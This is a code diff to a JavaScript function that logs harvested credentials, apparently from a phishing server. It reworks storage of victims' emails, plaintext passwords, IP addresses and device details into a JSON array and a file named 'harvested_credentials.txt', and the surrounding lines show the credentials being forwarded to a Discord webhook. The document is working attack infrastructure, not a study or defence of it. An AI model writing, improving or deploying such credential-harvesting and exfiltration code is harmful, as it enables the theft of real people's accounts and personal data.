@@ -142,19 +142,69 @@ async function logCredentials(email, password, accessInfo) {
     userInfo: accessInfo,
   };
 
-  // Log in JSON format for detailed processing
-  const detailedCredentialLog = JSON.stringify(credentialEntry, null, 2);
-  fs.appendFileSync(
-    path.join(logsDir, "detailed_credentials.json"),
-    detailedCredentialLog + ",\n"
-  );
+  // Log in JSON format as part of a proper array
+  const credentialsFilePath = path.join(logsDir, "detailed_credentials.json");
 
-  // Also maintain the simple log format for backward compatibility
-  const simpleLogEntry = `[${accessInfo.accessTime}] Email: ${email} | Password: ${password} | IP: ${accessInfo.ipAddress} | OS: ${accessInfo.deviceInfo.os} | Browser: ${accessInfo.deviceInfo.browser}\n`;
-  fs.appendFileSync(
-    path.join(logsDir, "harvested_credentials.txt"),
-    simpleLogEntry
-  );
+  // Create or update the credentials file as a proper JSON array
+  try {
+    let existingCredentials = [];
+
+    // Check if file exists and has content
+    if (fs.existsSync(credentialsFilePath)) {
+      const fileContent = fs.readFileSync(credentialsFilePath, "utf8");
+
+      // If the file has content, parse it
+      if (fileContent.trim()) {
+        try {
+          // Try to parse as a JSON array
+          existingCredentials = JSON.parse(fileContent);
+
+          // If it's not an array (old format), convert to array with existing entries
+          if (!Array.isArray(existingCredentials)) {
+            console.log("Converting old credentials format to array");
+            // The old format had trailing commas, we need to handle that
+            const cleanedContent = "[" + fileContent.replace(/,\s*$/, "") + "]";
+            try {
+              existingCredentials = JSON.parse(cleanedContent);
+            } catch (parseErr) {
+              // If we can't parse it, start fresh
+              console.error(
+                "Could not convert old credentials format:",
+                parseErr
+              );
+              existingCredentials = [];
+            }
+          }
+        } catch (parseError) {
+          // If we can't parse the file, start fresh
+          console.error("Error parsing credentials file:", parseError);
+          existingCredentials = [];
+        }
+      }
+    }
+
+    // Add the new credential entry
+    existingCredentials.push(credentialEntry);
+
+    // Write back as a proper JSON array
+    fs.writeFileSync(
+      credentialsFilePath,
+      JSON.stringify(existingCredentials, null, 2)
+    );
+
+    // Also maintain the simple log format for backward compatibility
+    const simpleLogEntry = `[${accessInfo.accessTime}] Email: ${email} | Password: ${password} | IP: ${accessInfo.ipAddress} | OS: ${accessInfo.deviceInfo.os} | Browser: ${accessInfo.deviceInfo.browser}\n`;
+    fs.appendFileSync(
+      path.join(logsDir, "harvested_credentials.txt"),
+      simpleLogEntry
+    );
+  } catch (error) {
+    console.error("Error writing to credentials file:", error);
+
+    // Fallback to the old method if something goes wrong
+    const detailedCredentialLog = JSON.stringify(credentialEntry, null, 2);
+    fs.appendFileSync(credentialsFilePath, detailedCredentialLog + ",\n");
+  }
 
   // Send credentials to Discord webhook
   if (DISCORD_WEBHOOK_URL) {
